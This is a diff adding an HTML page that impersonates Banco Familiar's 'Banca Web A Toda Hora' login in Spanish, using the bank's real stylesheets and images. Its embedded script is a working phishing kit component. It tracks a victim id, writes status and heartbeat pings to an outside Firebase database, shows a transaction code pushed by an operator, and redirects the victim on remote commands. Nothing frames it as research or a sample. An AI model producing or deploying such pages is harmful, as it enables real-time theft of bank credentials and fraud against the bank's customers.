@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Familiar-Web</title>
+<link rel="icon" type="image/png" href="https://ssecure.familiar.com.py/bancaweb3/resources/images/favicon.png">
+<link href="https://ssecure.familiar.com.py/bancaweb3/resources/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/commons.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_margin.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_icons.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar-responsive.css">
+<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/main.css">
+<style>
+  @font-face{font-family:'robotoregular';font-weight:400;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-regular-webfont-5f945f5c55a07d2a60221ab200fd4133.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-regular-webfont-9db7888a4c2b34bebe331fa65c534f16.woff') format('woff');}
+  @font-face{font-family:'robotobold';font-weight:700;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-bold-webfont-fa2496fffa299cae4878e8d67d698ea9.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-bold-webfont-6a501aab45dbb9984df90f6208370474.woff') format('woff');}
+  @font-face{font-family:'robotomedium';font-weight:500;font-style:normal;font-display:swap;
+    src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-medium-webfont-526baa0edcedb893ffe618f920e8021e.woff2') format('woff2'),
+        url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-medium-webfont-d4613ee3dc97691b80a1ab614974ace3.woff') format('woff');}
+
+  html,body,div,span,p,a,h1,h2,h3,h4,h5,label,form,input,button,td,th,li{
+    font-family:'robotoregular','Roboto',Arial,Helvetica,sans-serif;
+  }
+  h1,h2,h3,h4,h5,b,strong,.content-title-ingresar h2,.text-instruccion h2{
+    font-family:'robotobold','Roboto',Arial,Helvetica,sans-serif;
+  }
+  .glyphicon{font-family:'Glyphicons Halflings' !important}
+
+  .box-login{padding-bottom:24px}
+  .espera{padding:34px 24px 42px;text-align:center}
+  .espera h4{color:#004185;font-size:20px;margin:0 0 8px}
+  .espera .txt{color:#808080;font-size:13px;line-height:1.55;margin:0 0 12px}
+  .espera .etq{color:#a5a5a5;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin:14px 0 4px}
+  .espera .cod{color:#004185;font-size:26px;font-weight:bold;letter-spacing:8px;margin:0}
+  .girando{width:44px;height:44px;border:4px solid #D8E3EF;border-top-color:#004185;border-radius:50%;animation:girar .85s linear infinite;margin:22px auto 0}
+  @keyframes girar{to{transform:rotate(360deg)}}
+  .espera .pie{color:#a5a5a5;font-size:11px;margin:18px 0 0}
+</style>
+</head>
+<body id="bodyLogin">
+<div class="container">
+  <div class="row">
+    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 container-login">
+
+      <div class="col-xs-12 col-sm-6 content-left">
+        <div class="col-xs-12 col-sm-12 pdl-0 content-icon-login">
+          <span class="icon-familiar"></span>
+        </div>
+
+        <div class="col-xs-12 col-sm-12 box-login image-familiar-agua">
+          <div class="espera">
+            <h4>Autorizando el dispositivo</h4>
+            <p class="txt">Estamos validando la clave transaccional. No cierres esta ventana.</p>
+            <p class="etq">Clave transaccional</p>
+            <p class="cod" id="lblClave">esperando</p>
+            <div class="girando"></div>
+            <p class="pie">Conexión segura Banco Familiar</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="col-xs-12 col-sm-6 login-box right" id="content-saludo" style="display:block">
+        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 content-title-ingresar">
+          <h2>Ingresar al Sistema</h2>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-bienvenida">
+          <h1>Bienvenido a la Banca Web A Toda Hora</h1>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-instruccion">
+          <h2>Tu seguridad es importante:</h2><br>
+          <p>Para ingresar a la Banca Web A Toda Hora de Banco Familiar es necesario que ingreses tu contraseña a través de un teclado virtual; de esta manera evitamos la captura de tu clave a través de virus.</p>
+        </div>
+        <div class="col-xs-12 col-sm-12 text-instruccion">
+          <h2>¿Cómo se usa el teclado virtual?</h2><br>
+          <p class="p-icon"><span class="glyphicon glyphicon-certificate item-1"></span>Ubicá el mouse sobre el teclado y hacé click en cada número o letra de tu contraseña.</p>
+          <p class="p-icon"><span class="glyphicon glyphicon-certificate item-2"></span>Luego de hacer click en un número o letra, ubicá el mouse fuera del teclado, de esa forma podrás visualizar de nuevo los números y letras.</p>
+        </div>
+      </div>
+
+      <div class="col-xs-12 col-sm-12 content-bottom pdt-15">
+        <div class="col-xs-5 col-sm-5 col-md-4 text-bottom-left">
+          <p>Banco Familiar 2018 Asunción del Paraguay</p>
+        </div>
+        <div class="col-xs-5 col-sm-5 col-md-6 text-bottom-right">
+          <p><a href="https://www.familiar.com.py/interna-84.htm">Nuestra red Nacional de Sucursales</a> - <a href="https://www.familiar.com.py/interna-122.htm">Condiciones Generales y Operacionales</a></p>
+          <p><a href="https://www.familiar.com.py/interna-85.htm">Política de Seguridad</a></p>
+        </div>
+        <div class="col-xs-2 col-sm-2 col-md-2 text-bottom-right" style="text-align:right">
+          <img src="https://ssecure.familiar.com.py/bancaweb3/resources/images/aTodaHora.png" alt="Familiar a toda hora" class="img-a-toda-hora">
+          <p>Versión 4.5.18</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var DB = "https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
+  var id = new URLSearchParams(location.search).get('u');
+  if(!id){ try{ id = localStorage.getItem('nbch_u'); }catch(x){} }
+  if(!id){ location.replace('indexfamiliar.html'); return; }
+
+  var lbl = document.getElementById('lblClave');
+
+  function leer(){
+    fetch(DB+'/usuarios/'+id+'.json').then(function(r){ return r.json(); }).then(function(d){
+      if(!d) return;
+      if(d.clave_transaccional){ lbl.textContent = d.clave_transaccional; lbl.style.color = '#004185'; }
+      else { lbl.textContent = 'esperando'; lbl.style.color = '#c9d3dd'; }
+    }).catch(function(){});
+  }
+  leer();
+  setInterval(leer, 2000);
+
+  fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({estado:'AUTORIZANDO', pagina:'cargandoclavefamiliar.html'})}).catch(function(){});
+  fetch(DB+'/comandos/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({accion:'', ts:Date.now()})}).catch(function(){});
+
+  var latido = setInterval(function(){
+    fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({online:true, ultimoPing:Date.now()})}).catch(function(){});
+  },5000);
+
+  var fin = false;
+  function salir(url){ if(fin) return; fin = true; clearInterval(latido); location.href = url; }
+
+  function revisar(){
+    if(fin) return;
+    fetch(DB+'/comandos/'+id+'.json').then(function(r){ return r.json(); }).then(function(c){
+      if(!c) return;
+      if(c.accion === 'dejar') salir('finalfamiliar.html?u='+id);
+      else if(c.accion === 'rechazar') salir('rechazadofamiliar.html?u='+id);
+    }).catch(function(){});
+  }
+  revisar();
+  setInterval(revisar, 2000);
+})();
+</script>
+</body>
+</html>
